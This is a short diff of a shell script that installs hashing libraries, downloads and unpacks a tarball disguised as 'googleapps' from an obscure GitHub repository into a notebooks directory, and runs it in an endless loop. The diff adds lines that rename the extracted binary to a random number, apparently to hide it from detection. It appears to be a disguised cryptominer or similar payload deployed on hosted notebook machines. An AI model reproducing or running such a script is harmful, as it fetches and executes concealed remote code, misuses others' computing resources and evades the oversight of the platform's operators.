@@ -1,11 +1,15 @@
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
+google8474=$(shuf -i 8874748874-8874748874748874 -n 1)
+
 cd /notebooks/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/googleapps847412741274.tar.gz
 tar -xvf ./googleapps847412741274.tar.gz
 
 cd googleapps8474
+
+mv ./google84121274 ./$google8474
 
 while true
 do
